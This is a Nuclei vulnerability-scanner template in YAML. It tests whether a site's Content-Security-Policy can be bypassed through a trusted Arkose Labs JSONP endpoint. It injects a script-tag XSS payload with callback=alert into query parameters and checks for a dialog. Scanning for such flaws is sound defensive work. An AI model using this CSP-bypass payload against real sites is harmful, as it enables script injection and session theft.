id: arkoselabs-client-api-csp-bypass

info:
  name: Content-Security-Policy Bypass - Arkose Labs Client API
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,arkoselabs-client-api,vuln

flow: http(1) && headless(1)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        part: header
        words:
          - "Content-Security-Policy"
          - "arkoselabs.com"
        condition: and
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: arkoselabs_client_api_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "arkoselabs_client_api_csp_xss == true"
